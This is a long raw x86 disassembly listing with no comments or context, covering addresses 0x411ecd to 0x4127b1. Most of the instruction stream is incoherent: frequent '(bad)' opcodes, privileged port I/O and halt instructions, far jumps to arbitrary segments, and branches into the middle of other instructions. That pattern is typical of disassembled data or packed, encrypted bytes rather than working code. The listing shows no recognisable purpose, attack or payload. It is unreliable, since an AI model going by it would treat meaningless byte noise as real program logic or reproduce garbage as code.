  411ecd:	and    ecx,DWORD PTR [ebx]
  411ecf:	add    dl,al
  411ed1:	scas   eax,DWORD PTR es:[edi]
  411ed2:	cmc    
  411ed3:	jmp    0xa88202af
  411ed8:	(bad)  
  411ed9:	scas   eax,DWORD PTR es:[edi]
  411eda:	jnp    0x411ec1
  411edc:	inc    edi
  411edd:	cld    
  411ede:	cmp    esi,ebp
  411ee0:	push   edx
  411ee1:	pop    edi
  411ee2:	cmp    DWORD PTR [ecx-0x2902e7ac],0x3b58ae52
  411eec:	pusha  
  411eed:	or     al,0x3a
  411eef:	into   
  411ef0:	push   edx
  411ef1:	sbb    al,0x8c
  411ef3:	mov    ecx,0x0
	...
  411f08:	inc    edx
  411f09:	scas   al,BYTE PTR es:[edi]
  411f0a:	cmc    
  411f0b:	rol    DWORD PTR [edx+0x7e],1
  411f0e:	cmc    
  411f0f:	mov    dh,0xc5
  411f11:	scas   eax,DWORD PTR es:[edi]
  411f12:	ins    DWORD PTR es:[edi],dx
  411f13:	call   0xa64973cc
  411f18:	cld    
  411f19:	mov    edi,0xaed29efd
  411f1e:	jnp    0x411f01
  411f20:	out    0xa5,eax
  411f22:	cmp    cl,BYTE PTR [esi-0x6a73e32e]
  411f28:	ret    0xf5ae
  411f2b:	push   0x14
  411f2d:	mov    ebx,0xafca76fd
  411f32:	jns    0x411f4e
  411f34:	cmp    BYTE PTR [ecx-0x5070579d],bl
  411f3a:	mov    ebx,0xf5aeda4d
  411f3f:	inc    ecx
  411f40:	cmc    
  411f41:	popa   
  411f42:	cmc    
  411f43:	dec    esi
  411f44:	call   FWORD PTR [esi+0x60]
  411f47:	add    BYTE PTR [ecx],ah
  411f49:	cwde   
  411f4a:	or     BYTE PTR [eax],al
  411f4c:	push   0x4
  411f4e:	out    dx,al
  411f4f:	neg    DWORD PTR [edx+0x56]
  411f52:	ins    DWORD PTR es:[edi],dx
  411f53:	mov    dh,0xed
  411f55:	xlat   BYTE PTR ds:[ebx]
  411f56:	cmc    
  411f57:	addr16 mov ecx,ebp
  411f5a:	dec    eax
  411f5b:	add    BYTE PTR ds:0xf54164c1,bl
  411f61:	dec    edx
  411f62:	inc    edi
  411f63:	sbb    esp,ebp
  411f65:	xchg   edx,eax
  411f66:	mov    eax,edi
  411f68:	out    0xe0,al
  411f6a:	sbb    eax,0x68
	...
  411f7f:	add    ch,dh
  411f81:	xchg   edx,eax
  411f82:	in     eax,0xbe
  411f84:	or     eax,0xe541638e
  411f89:	push   ebp
  411f8a:	mov    esp,0xf658b2e8
  411f8f:	jmp    DWORD PTR [eax-0x58]
  411f92:	in     eax,dx
  411f93:	outs   dx,DWORD PTR ds:[esi]
  411f94:	jge    0x411fef
  411f96:	imul   al
  411f98:	pop    ebp
  411f99:	mov    ebp,esi
  411f9b:	dec    edx
  411f9d:	fiadd  WORD PTR ds:0xfe4820ff
  411fa3:	(bad)  
  411fa4:	ficomp DWORD PTR [eax+0x7c]
  411fa7:	or     ch,cl
  411fa9:	dec    esp
  411faa:	repz (bad) 
  411fac:	jmp    0xf658:0x22f0bc58
  411fb3:	call   0x36a771
  411fb8:	or     bl,BYTE PTR [esi]
  411fba:	loop   0x411fb3
  411fbc:	or     bl,BYTE PTR [eax-0x13]
  411fbf:	push   ecx
  411fc0:	pop    edx
  411fc1:	pop    ecx
  411fc2:	idiv   bh
  411fc4:	mov    al,0x60
  411fc6:	loopne 0x411fcc
  411fc8:	jmp    0xed56:0x30fff657
  411fcf:	ins    DWORD PTR es:[edi],dx
  411fd0:	mov    ds,WORD PTR [eax+0x108cff08]
  411fd6:	push   ebp
  411fd7:	idiv   BYTE PTR [ebx]
  411fd9:	pop    edi
  411fda:	push   esp
  411fdb:	xor    eax,0xc84b5663
  411fe0:	dec    esi
  411fe1:	ror    BYTE PTR [ecx],0x55
	...
  411ff8:	pop    ss
  411ff9:	pop    eax
  411ffa:	xchg   ebx,eax
  411ffc:	sbb    dl,dl
  411ffe:	or     DWORD PTR [edx-0x49],ebp
  412001:	jbe    0x411fc8
  412003:	pop    es
  412004:	hlt    
  412005:	rcr    DWORD PTR ds:0xb53503ff,cl
  41200b:	sti    
  41200c:	sti    
  41200d:	or     dl,dh
  41200f:	addr16 jmp 0x412019
  412012:	retf   
  412013:	(bad)  
  412014:	jmp    0x51bb:0x4d4721e8
  41201b:	(bad)  
  41201c:	fidivr DWORD PTR [esi-0x5ca601b4]
  412022:	shl    esi,1
  412024:	cmp    BYTE PTR [esp+ecx*1+0x68],bh
  412028:	mov    ?,WORD PTR [ebx+0x5fa48009]
  41202e:	dec    esi
  41202f:	(bad)  
  412030:	mov    bl,0x43
  412032:	or     al,0x0
  412034:	mov    ebx,0x3126d12d
  412039:	jl     0x412047
  41203b:	push   0xffc97060
  412040:	xchg   edx,eax
  412041:	nop
  412042:	hlt    
  412043:	out    0xaa,eax
  412045:	push   ebx
  412046:	dec    ebx
  412047:	inc    BYTE PTR [ebx+0x1fe4090]
  41204d:	mov    ah,0x51
  41204f:	push   ebx
  412050:	mov    al,ds:0x4ec84d16
  412055:	mov    bh,0x9
  412057:	push   ebp
  412058:	pop    ss
  412059:	pop    ss
  41205a:	mov    eax,ebx
	...
  412070:	adc    al,0x26
  412072:	dec    esp
  412073:	inc    BYTE PTR [ecx]
  412075:	xchg   esp,eax
  412076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412077:	inc    edi
  412078:	fld    TBYTE PTR [ebp+0x2742f7dc]
  41207e:	out    0x5b,eax
  412080:	daa    
  412081:	mov    bl,bh
  412083:	add    eax,DWORD PTR [edi+0x327efed4]
  412089:	xchg   edx,eax
  41208a:	fild   WORD PTR [ebx]
  41208c:	dec    ebx
  41208d:	push   edi
  41208e:	aaa    
  41208f:	add    ecx,DWORD PTR [esp+edx*4-0x5737c321]
  412096:	cs cld 
  412098:	or     ebp,DWORD PTR [ebp-0x6b89fc67]
  41209e:	mov    DWORD PTR [ebx],eax
  4120a0:	xchg   sp,ax
  4120a2:	push   esp
  4120a3:	mov    esi,0x7e7c43ff
  4120a8:	fbld   TBYTE PTR [esi+esi*8+0x74ad5343]
  4120af:	dec    ebx
  4120b0:	fisub  DWORD PTR [esi]
  4120b2:	jecxz  0x41210e
  4120b4:	adc    DWORD PTR [edx-0x2b68fc21],ecx
  4120ba:	pop    ebx
  4120bb:	or     DWORD PTR [ebp-0x73fc1e07],esi
  4120c1:	cmp    al,0x9b
  4120c3:	int3   
  4120c4:	dec    esp
  4120c5:	xchg   esp,eax
  4120c6:	into   
  4120c7:	mov    ecx,0xf5e6bc97
  4120cc:	mov    ds:0x8546aac,al
  4120d1:	pop    ss
  4120d2:	mov    esp,0x3b
	...
  4120e7:	add    BYTE PTR [edx+0x73d62fac],dl
  4120ed:	inc    ecx
  4120ee:	rol    DWORD PTR [edx-0x7e],1
  4120f1:	push   ds
  4120f2:	gs xor al,0x82
  4120f5:	lods   al,BYTE PTR ds:[esi]
  4120f6:	xchg   BYTE PTR [esi-0x4eedcb8d],ch
  4120fc:	int3   
  4120fd:	xchg   esp,eax
  4120fe:	jbe    0x412179
  412100:	jae    0x4120a6
  412102:	or     BYTE PTR [esi-0x31],dh
  412105:	stos   BYTE PTR es:[edi],al
  412106:	jnp    0x4120e9
  412108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412109:	dec    ecx
  41210a:	aaa    
  41210b:	iretw  
  41210d:	sbb    al,0x8c
  41210f:	dec    ebp
  412110:	xchg   DWORD PTR [edx+0x3c8fc3f5],ebp
  412116:	push   0xf6ac48bc
  41211b:	jl     0x41217d
  41211d:	mov    ds:0x20cf3ef5,al
  412122:	add    BYTE PTR [ecx+0x53],al
  412125:	gs cmc 
  412127:	add    DWORD PTR cs:[ecx],edx
  41212a:	loope  0x41214a
  41212c:	dec    edi
  41212d:	stos   BYTE PTR es:[edi],al
  41212e:	(bad)  
  41212f:	jmp    0xa8a4606b
  412134:	(bad)  
  412135:	stos   DWORD PTR es:[edi],eax
  412136:	mov    ebx,0xf5aab719
  41213b:	push   es
  41213c:	and    eax,0xd8d1e094
  412141:	stos   BYTE PTR es:[edi],al
  412142:	cmc    
  412143:	pusha  
  412144:	add    eax,0x4eeefdb8
  412149:	sbb    BYTE PTR [ebp+eax*8+0x0],cl
	...
  412160:	xchg   BYTE PTR [edx+0x20f039f5],ch
  412166:	arpl   WORD PTR [eax],bp
  412168:	nop
  412169:	stos   DWORD PTR es:[edi],eax
  41216a:	mov    ebx,0xf5aa76d9
  41216f:	(bad)  
  412170:	in     al,0x93
  412172:	loopne 0x412165
  412174:	cwde   
  412175:	stos   BYTE PTR es:[edi],al
  412176:	cmc    
  412177:	pusha  
  412178:	add    al,0xcc
  41217a:	std    
  41217b:	scas   al,BYTE PTR es:[edi]
  41217c:	dec    esi
  41217d:	cmp    eax,0x384d1108
  412182:	inc    edi
  412183:	jmp    0x9f3a0256
  412188:	into   
  412189:	stos   BYTE PTR es:[edi],al
  41218a:	cmc    
  41218b:	adc    al,0x80
  41218d:	mov    esp,0x562500e3
  412192:	test   BYTE PTR [ecx-0x1b018],0xe2
  412199:	add    al,0x8d
  41219b:	rcr    dl,1
  41219d:	push   esi
  41219e:	not    BYTE PTR [eax+0x5d]
  4121a1:	pop    ds
  4121a2:	gs inc ecx
  4121a4:	xor    eax,0xdaf0bc56
  4121a9:	push   esi
  4121aa:	idiv   bh
  4121ac:	pop    eax
  4121ad:	lahf   
  4121ae:	loopne 0x41217d
  4121b0:	and    eax,0xa889f656
  4121b5:	inc    ebx
  4121b6:	(bad)  
  4121b7:	jmp    DWORD PTR [edx-0x7]
  4121ba:	cmc    
  4121bb:	addr16 mov ecx,0xb20048e4
  4121c1:	sub    al,0xe5
  4121c3:	test   DWORD PTR [eax],0x0
	...
  4121d5:	add    BYTE PTR [eax],al
  4121d7:	add    BYTE PTR [edx-0x128a09aa],ah
  4121dd:	jle    0x412196
  4121df:	xor    BYTE PTR [edx-0x5e7a7faa],al
  4121e5:	outs   dx,BYTE PTR ds:[esi]
  4121e6:	idiv   bh
  4121e8:	jo     0x412206
  4121ea:	retf   0xe2f7
  4121ed:	push   esp
  4121ee:	inc    ebp
  4121ef:	push   0x48e442
  4121f4:	mov    dl,0x22
  4121f6:	in     eax,0xf7
  4121f8:	loop   0x41224e
  4121fa:	div    BYTE PTR [ebp-0x53]
  4121fd:	jle    0x412196
  4121ff:	xor    dl,al
  412201:	push   esp
  412202:	add    BYTE PTR [ebp-0x99323],0x3f
  412209:	nop
  41220a:	pusha  
  41220b:	test   al,0x50
  41220d:	xlat   BYTE PTR ds:[ebx]
  41220e:	cmc    
  41220f:	(bad)  
  412210:	sbb    BYTE PTR [eax-0x2],ah
  412213:	push   DWORD PTR [edx]
  412215:	push   esp
  412216:	jl     0x412220
  412218:	sbb    eax,0x8cff25ec
  41221d:	add    al,BYTE PTR [edx+0x48034c84]
  412223:	(bad)  
  412224:	sbb    DWORD PTR [ecx],edi
  412226:	je     0x41221e
  412228:	arpl   WORD PTR [ebx],bp
  41222a:	fsub   QWORD PTR [edi+0x20]
  41222d:	xchg   ecx,eax
  41222e:	leave  
  41222f:	call   DWORD PTR [edx+0x61]
  412232:	cmp    al,0xf6
  412234:	dec    ebx
  412235:	xor    eax,DWORD PTR [edi+0x74]
  412238:	xchg   esp,eax
  412239:	inc    ebx
  41223a:	iret   
  41223b:	das    
	...
  412250:	cmp    eax,DWORD PTR [ebx-0x7f]
  412253:	test   al,dh
  412255:	inc    edx
  412256:	inc    edi
  412257:	dec    BYTE PTR [edi]
  412259:	adc    DWORD PTR [ecx],edi
  41225b:	mul    BYTE PTR [ebx]
  41225d:	imul   ecx,DWORD PTR [edi+ecx*1],0x10
  412261:	jnp    0x41226f
  412263:	add    BYTE PTR [esi+edi*1+0x7303cf75],cl
  41226a:	inc    edi
  41226b:	(bad)  
  41226c:	js     0x412226
  41226e:	mov    WORD PTR [esp+esi*1-0x7301b875],?
  412275:	retf   0xb08d
  412278:	mov    WORD PTR [ebx-0x447397f7],?
  41227e:	cmp    BYTE PTR [ebp-0x17e6d725],bh
  412284:	push   ss
  412285:	aad    0x48
  412287:	dec    bl
  412289:	or     BYTE PTR [esi],ah
  41228b:	test   bl,0xca
  41228e:	dec    eax
  41228f:	je     0x41222d
  412291:	rcl    DWORD PTR [edi],cl
  412293:	sub    dh,BYTE PTR [ebx-0x4b4bb726]
  412299:	jmp    0xe81c:0x60a3fe48
  4122a0:	mov    WORD PTR [ebp+0x2093fe47],ss
  4122a6:	sub    eax,0xae948bf6
  4122ab:	inc    eax
  4122ac:	clc    
  4122ad:	test   BYTE PTR [edi-0x61565bcb],dl
  4122b3:	inc    eax
	...
  4122c8:	cmp    al,cl
  4122ca:	sahf   
  4122cb:	inc    eax
  4122cc:	push   0xffffffa9
  4122ce:	xor    al,0x23
  4122d0:	pop    edx
  4122d1:	test   eax,0x84e04076
  4122d6:	xchg   DWORD PTR [ebp-0x5c],esi
  4122d9:	test   eax,0xcc004066
  4122de:	push   esi
  4122df:	inc    eax
  4122e0:	inc    edx
  4122e1:	test   eax,0xc42413dc
  4122e6:	or     BYTE PTR [ecx+0x32],al
  4122e9:	test   eax,0xa922539c
  4122ee:	dec    esi
  4122ef:	inc    eax
  4122f0:	fdivr  DWORD PTR [edi-0x56e5bfc2]
  4122f6:	mov    ah,0x13
  4122f8:	and    al,0x4
  4122fa:	or     DWORD PTR [ecx+0xa],eax
  4122fd:	test   eax,0xa8fa4f54
  412302:	push   ss
  412303:	inc    eax
  412304:	add    BYTE PTR [edi+eax*1+0x6a9a471],0x40
  41230c:	and    al,dl
  41230e:	idiv   BYTE PTR [edi]
  412310:	loop   0x4122ba
  412312:	cmp    al,0x4b
  412314:	loop   0x4122be
  412316:	(bad)  
  412317:	aas    
  412318:	pop    eax
  412319:	test   BYTE PTR [edi],al
  41231b:	mov    cl,0x74
  41231d:	test   eax,0xd3f83fee
  412322:	fidivr WORD PTR [edi]
  412324:	mov    edx,0xa41454a8
  412329:	pop    ss
  41232a:	or     DWORD PTR [edi],edi
	...
  412340:	stos   BYTE PTR es:[edi],al
  412341:	test   al,0x74
  412343:	jl     0x4122df
  412345:	test   al,0xb6
  412347:	aas    
  412348:	loopne 0x412331
  41234a:	or     BYTE PTR [esi+0x34f5aa53],bh
  412350:	mov    al,ds:0xc2d044bc
  412355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412356:	cmc    
  412357:	adc    al,0xa0
  412359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235a:	mov    ebx,0xf5a6bb99
  41235f:	mov    fs,WORD PTR ds:0xcd6be090
  412365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412366:	cmc    
  412367:	jle    0x41233e
  412369:	mov    bh,0xfd
  41236b:	jbe    0x412300
  41236d:	scas   eax,DWORD PTR es:[edi]
  41236e:	aas    
  41236f:	mov    ebp,0x9cf5a68a
  412374:	jl     0x412314
  412376:	cmc    
  412377:	pop    esi
  412378:	push   0x73562469
  41237d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237e:	mov    ebx,0xf5a66341
  412383:	push   ecx
  412384:	pop    ds
  412385:	jl     0x41237c
  412387:	ds pop ebx
  412389:	loopne 0x412377
  41238b:	ds push ebx
  41238d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41238e:	loopne 0x412391
  412390:	cld    
  412391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412392:	cmc    
  412393:	es test edi,eax
  412396:	std    
  412397:	push   ds
  412398:	mov    ebx,0xb2c513af
  41239d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41239e:	cmc    
  41239f:	push   esp
  4123a0:	dec    eax
  4123a1:	sahf   
  4123a2:	cmc    
  4123a3:	push   es
	...
  4123b8:	mov    al,0x85
  4123ba:	and    al,0xfe
  4123bc:	call   0xf5a6:0x9b1dbba6
  4123c3:	add    DWORD PTR [ebx-0x7d190a88],edx
  4123c9:	loopne 0x41238f
  4123cb:	(bad)  
  4123cc:	jp     0x412374
  4123ce:	loopne 0x4123a5
  4123d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d2:	cmc    
  4123d3:	into   
  4123d4:	and    al,0xcf
  4123d6:	std    
  4123d7:	add    dl,cl
  4123d9:	in     ax,dx
  4123db:	icebp  
  4123dc:	jle    0x412445
  4123de:	idiv   bh
  4123e0:	adc    BYTE PTR [ebx-0x2],dl
  4123e3:	(bad)  
  4123e4:	cmp    bh,BYTE PTR [ebx-0x15]
  4123e7:	sub    ebp,DWORD PTR [edx]
  4123e9:	data16 div BYTE PTR [ebp-0x9a127]
  4123f0:	or     eax,0x1aff224a
  4123f5:	dec    sp
  4123f7:	clc    
  4123f8:	cld    
  4123f9:	mov    edx,0x66dafff4
  4123fe:	jl     0x4123fc
  412400:	or     eax,0x35001e5e
  412405:	pop    eax
  412406:	(bad)  
  412407:	or     al,0x35
  412409:	int3   
  41240a:	sub    ah,0xa6
  41240d:	dec    edi
  41240e:	icebp  
  41240f:	push   0x25
  412411:	std    
  412412:	push   ecx
  412413:	inc    DWORD PTR [eax-0x65]
  412416:	loopne 0x412405
  412418:	jge    0x412481
  41241a:	test   BYTE PTR [ecx+0x0],0x0
	...
  41242d:	add    BYTE PTR [eax],al
  41242f:	add    al,dh
  412431:	data16 div BYTE PTR [ebp+0x2d]
  412435:	sti    
  412436:	xor    ebp,DWORD PTR [ebp+0x34]
  412439:	xchg   ebx,eax
  41243a:	cmc    
  41243b:	xor    eax,0x48db4d
  412440:	popf   
  412441:	inc    esp
  412442:	icebp  
  412443:	call   FWORD PTR [edx+0xd087c66]
  412449:	test   eax,0xfaf54164
  41244e:	pop    es
  41244f:	add    ch,ah
  412451:	adc    ch,dh
  412453:	mov    ebx,0xfff668d9
  412458:	inc    eax
  412459:	div    BYTE PTR [di-0x43]
  41245d:	jp     0x412454
  41245f:	sub    dl,bl
  412461:	push   0xb98cc2c0
  412466:	or     DWORD PTR [ebp+0x17],edx
  412469:	jmp    0x44e1e7f5
  41246e:	or     al,0x0
  412470:	stos   DWORD PTR es:[edi],eax
  412471:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412473:	shl    BYTE PTR [ecx],0x7c
  412476:	or     al,0xff
  412478:	add    eax,ecx
  41247a:	xor    al,0x74
  41247c:	xchg   esp,eax
  41247d:	add    ebx,esi
  41247f:	push   ebx
  412480:	jnp    0x412489
  412482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412483:	add    BYTE PTR [esi+ecx*1-0x56a69889],cl
  41248a:	retf   0x62ff
  41248d:	test   eax,0xa3e1ff05
  412492:	and    DWORD PTR [edi],edi
	...
  4124a8:	mov    eax,0xc1fe331e
  4124ad:	(bad)  
  4124ae:	and    DWORD PTR [ebp+0xa332e7c],esp
  4124b4:	dec    esp
  4124b5:	sar    dh,0x88
  4124b8:	leave  
  4124b9:	aas    
  4124ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124bb:	jmp    FWORD PTR [ebx]
  4124bd:	addr16 jbe 0x412527
  4124c0:	dec    ebp
  4124c1:	ror    edx,0xff
  4124c4:	sbb    ah,cl
  4124c6:	xor    eax,0x21b399fe
  4124cb:	sbb    esp,DWORD PTR [eax+0x76]
  4124ce:	xor    esp,DWORD PTR [edi-0x73]
  4124d1:	mov    ebx,0x7864bd24
  4124d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124d7:	inc    eax
  4124d8:	mov    WORD PTR [esi-0x43],?
  4124db:	sti    
  4124dc:	jmp    0x4124de
  4124de:	add    ch,al
  4124e0:	mov    eax,DWORD PTR [edi]
  4124e2:	xor    eax,0x3520dbfe
  4124e7:	out    0x81,eax
  4124e9:	shl    BYTE PTR [esi+edi*8],cl
  4124ec:	aad    0x79
  4124ee:	add    al,0x0
  4124f0:	pop    ecx
  4124f1:	xchg   esp,eax
  4124f2:	jp     0x412523
  4124f4:	push   cs
  4124f5:	shr    DWORD PTR [ebx+0x32db3a9],1
  4124fb:	scas   al,BYTE PTR es:[edi]
  4124fc:	dec    esp
  4124fd:	xchg   esp,eax
  4124fe:	inc    edi
  4124ff:	xor    BYTE PTR [eax],dh
  412501:	push   ebx
  412502:	fistp  QWORD PTR [eax+eiz*1]
  412505:	cwde   
  412506:	xlat   BYTE PTR ds:[ebx]
  412507:	add    al,0x62
  412509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41250a:	mov    esi,0x8
	...
  41251f:	add    BYTE PTR [eax+eiz*1-0x23],cl
  412523:	mov    cl,al
  412525:	test   al,0xae
  412527:	mov    dh,0x77
  412529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41252a:	sbb    al,0xc
  41252c:	fs inc ebp
  41252e:	sahf   
  41252f:	cmp    al,0x6a
  412531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412532:	sbb    al,0x40
  412534:	imul   edi,DWORD PTR [edi+0x3a5a3cd9],0xffffffdf
  41253b:	stos   DWORD PTR es:[edi],eax
  41253c:	cdq    
  41253d:	and    BYTE PTR ss:[esp+esi*4],al
  412541:	mov    eax,0xa643c2f4
  412546:	aam    0xf
  412548:	and    al,0xcb
  41254a:	add    al,0x3d
  41254c:	xor    bl,BYTE PTR [ecx+0x1b81b71f]
  412552:	lods   eax,DWORD PTR ds:[esi]
  412553:	aas    
  412554:	and    bl,BYTE PTR [edi]
  412556:	dec    ebx
  412557:	cmp    al,0xa0
  412559:	pushf  
  41255a:	push   edi
  41255b:	repnz adc ah,BYTE PTR [ebp-0x577fc3c2]
  412562:	inc    edi
  412563:	fs mov ch,0xa5
  412566:	cs test eax,0xadae2cfb
  41256c:	dec    esp
  41256d:	xchg   esp,eax
  41256e:	xchg   DWORD PTR [ecx],eax
  412570:	jp     0x4125c5
  412572:	fistp  QWORD PTR [eax+ebx*2]
  412575:	cwde   
  412576:	pop    ss
  412577:	push   0x7f6a5a8
  41257c:	int3   
  41257d:	pop    ds
  41257e:	or     bh,bl
  412580:	push   ss
  412581:	push   eax
  412582:	hlt    
  412583:	out    dx,al
	...
  412598:	stc    
  412599:	test   al,0xf5
  41259b:	pop    esp
  41259c:	mov    BYTE PTR [ecx+ecx*1-0xa598822],bh
  4125a3:	pop    esp
  4125a4:	lods   eax,DWORD PTR fs:[esi]
  4125a6:	outs   dx,DWORD PTR ds:[esi]
  4125a7:	add    esp,DWORD PTR [edi-0x5a]
  4125aa:	sub    DWORD PTR [esp+ebx*2],0x55
  4125ae:	pusha  
  4125af:	sub    dh,ah
  4125b1:	push   ebx
  4125b2:	or     BYTE PTR [ecx-0x6e],al
  4125b5:	xor    al,BYTE PTR [edi-0x17]
  4125b8:	(bad)  
  4125b9:	sub    BYTE PTR [ecx+edx*4],al
  4125bc:	cmp    esi,DWORD PTR [ecx-0xb]
  4125bf:	sahf   
  4125c0:	adc    esp,0x7c
  4125c3:	adc    BYTE PTR [ecx],bl
  4125c5:	pop    ecx
  4125c6:	lock push 0x25
  4125c9:	test   al,0xc
  4125cb:	cld    
  4125cc:	daa    
  4125cd:	cmovl  eax,DWORD PTR [ecx-0x26cb5bfd]
  4125d4:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4125d6:	cmc    
  4125d7:	test   DWORD PTR [esp+ebx*8-0x6b6ff1e8],0xae7fa47f
  4125e2:	inc    esp
  4125e3:	push   esi
  4125e4:	fnsave [ebx+0x54f59e60]
  4125ea:	or     BYTE PTR [ebp+ecx*2-0x24],dh
  4125ee:	pop    eax
  4125ef:	push   ecx
  4125f0:	inc    ecx
  4125f1:	mov    cl,BYTE PTR [eax]
  4125f3:	jmp    0x5c45fe0a
  4125f8:	int    0xd7
  4125fa:	pop    eax
  4125fb:	je     0x4125fd
	...
  41260d:	add    BYTE PTR [eax],al
  41260f:	add    ch,cl
  412611:	fistp  DWORD PTR [eax-0x6f]
  412614:	mov    DWORD PTR [edx],esi
  412616:	inc    edi
  412617:	jmp    0x1454ec2
  41261c:	div    DWORD PTR [eax-0xb]
  41261f:	add    BYTE PTR [edx-0x4e8b376d],dl
  412625:	adc    BYTE PTR [ebp-0x4],cl
  412628:	ss (bad) 
  41262b:	add    edi,DWORD PTR [ebx]
  41262d:	xchg   edx,eax
  41262e:	cmc    
  41262f:	jne    0x4125e2
  412631:	pop    esi
  412632:	jl     0x41263c
  412634:	fstp   QWORD PTR [eax]
  412636:	hlt    
  412637:	inc    edx
  412639:	pop    esi
  41263a:	jl     0x412638
  41263c:	int    0x66
  41263e:	and    bh,bh
  412640:	rcr    BYTE PTR [esi+0x44],cl
  412643:	lock es fsubr st(5),st
  412647:	add    al,cl
  412649:	div    BYTE PTR cs:[ebp+0x3d]
  41264d:	outs   dx,DWORD PTR ds:[esi]
  41264e:	jmp    0x412679
  412650:	xor    bl,BYTE PTR [esi-0x40]
  412653:	ret    0x977d
  412656:	pop    ebx
  412657:	mov    edx,DWORD PTR [ecx]
  412659:	sbb    cl,dl
  41265b:	cld    
  41265c:	(bad)  
  41265d:	cwde   
  41265e:	bound  ebx,QWORD PTR [ebp+0x12]
  412661:	in     al,0xd
  412663:	call   0x37dcc5
  412668:	lods   al,BYTE PTR ds:[esi]
  412669:	aam    0xf1
  41266b:	push   0xbee59735
  412670:	pop    ebp
  412671:	pop    eax
  412672:	fs inc ecx
	...
  412688:	and    eax,0xf46dd0ef
  41268d:	xchg   esi,eax
  41268e:	cmc    
  41268f:	jne    0x4126be
  412691:	outs   dx,DWORD PTR ds:[esi]
  412692:	cli    
  412693:	push   edx
  412694:	rcr    BYTE PTR [esi+0x6d],cl
  412697:	add    DWORD PTR ds:0xb068b36e,esp
  41269d:	in     al,dx
  41269e:	dec    eax
  41269f:	add    ch,cl
  4126a1:	aas    
  4126a2:	fs inc ecx
  4126a4:	in     eax,0x5d
  4126a6:	jl     0x4126b0
  4126a8:	popf   
  4126a9:	dec    ebx
  4126aa:	push   edi
  4126ab:	dec    DWORD PTR [edx+ecx*4-0x5e1c005f]
  4126b2:	jo     0x41271b
  4126b4:	int    0x7
  4126b6:	int    0xff
  4126b8:	imul   ecx,DWORD PTR [edi-0x5573bf60],0xffffffa5
  4126bf:	pop    es
  4126c0:	mov    ah,0x77
  4126c2:	(bad)  
  4126c4:	mov    ebx,0xa3000944
  4126c9:	add    ah,BYTE PTR [ebp+0xc6c39cc]
  4126cf:	push   0xffc95fae
  4126d4:	call   0x2f7e:0xe2e8045f
  4126db:	dec    BYTE PTR [ebx-0x32b8ae5f]
  4126e1:	stos   DWORD PTR es:[edi],eax
  4126e2:	xor    BYTE PTR [esp+eax*4+0x3],dh
  4126e6:	xlat   BYTE PTR ds:[ebx]
  4126e7:	std    
  4126e8:	jae    0x4126ed
  4126ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126eb:	add    DWORD PTR [eax],eax
	...
  4126fd:	add    BYTE PTR [eax],al
  4126ff:	add    BYTE PTR [ebx+ebp*4-0x4c260177],cl
  412706:	and    DWORD PTR [edx+ebx*2+0x1b],ecx
  41270a:	xor    dh,bh
  41270c:	fstp   DWORD PTR [edi]
  41270e:	das    
  41270f:	je     0x4126a5
  412711:	adc    eax,DWORD PTR [edx+0x25]
  412714:	inc    ebx
  412715:	xor    eax,DWORD PTR [ecx-0x3f]
  412718:	nop
  412719:	stos   DWORD PTR es:[edi],eax
  41271a:	(bad)  
  41271b:	mov    ah,BYTE PTR [eax]
  41271d:	das    
  41271e:	dec    eax
  41271f:	sti    
  412720:	sub    eax,ecx
  412722:	add    eax,0x219b99ff
  412727:	xchg   edi,eax
  412728:	push   ebp
  412729:	pop    edx
  41272a:	das    
  41272b:	or     cl,BYTE PTR [eax+ebp*8-0x6]
  41272f:	mov    BYTE PTR [ecx+0x67],dl
  412732:	das    
  412733:	je     0x4126d9
  412735:	jb     0x4126dc
  412737:	pop    es
  412738:	in     al,0x94
  41273a:	xor    al,0xdf
  41273c:	repnz mov eax,ds:0xa197af16
  412742:	xchg   esp,eax
  412743:	or     esi,esp
  412745:	jo     0x412714
  412747:	cmp    dl,bl
  412749:	mov    eax,ds:0x27d23774
  41274e:	imul   DWORD PTR [ebx]
  412750:	ins    BYTE PTR es:[edi],dx
  412751:	jp     0x412751
  412753:	cmp    dl,al
  412755:	daa    
  412756:	jecxz  0x412783
  412758:	xchg   ecx,eax
  412759:	imul   ebp,esi,0x38
  41275c:	sti    
  41275d:	xchg   ebx,eax
  41275e:	fild   WORD PTR [ebx]
  412760:	mov    ebx,cs
  412762:	mov    eax,ds:0xf
	...
  412777:	add    BYTE PTR [edi+eax*2-0x26f1d896],cl
  41277e:	(bad)  
  41277f:	sar    BYTE PTR [ecx],1
  412781:	inc    ebp
  412782:	sbb    bl,BYTE PTR [ebp+0x4a]
  412785:	dec    ecx
  412786:	dec    ebp
  412787:	ret    
  412788:	adc    DWORD PTR [eax],0x2d
  41278b:	cmp    bl,cl
  41278d:	dec    ecx
  41278e:	scas   al,BYTE PTR es:[edi]
  41278f:	scas   al,BYTE PTR es:[edi]
  412790:	and    DWORD PTR [ecx-0x588bf7e4],0xffffffca
  412797:	cmp    BYTE PTR [edx-0x73],ah
  41279a:	lahf   
  41279b:	scas   eax,DWORD PTR es:[edi]
  41279c:	jne    0x4127e2
  41279e:	pop    ss
  41279f:	add    al,0x8c
  4127a1:	mov    cl,0x35
  4127a3:	cmp    al,al
  4127a5:	mov    al,ds:0x2742d10f
  4127aa:	out    0x2b,eax
  4127ac:	mov    edx,0x86386ea1
  4127b1:	mov    esp,0xa1737857
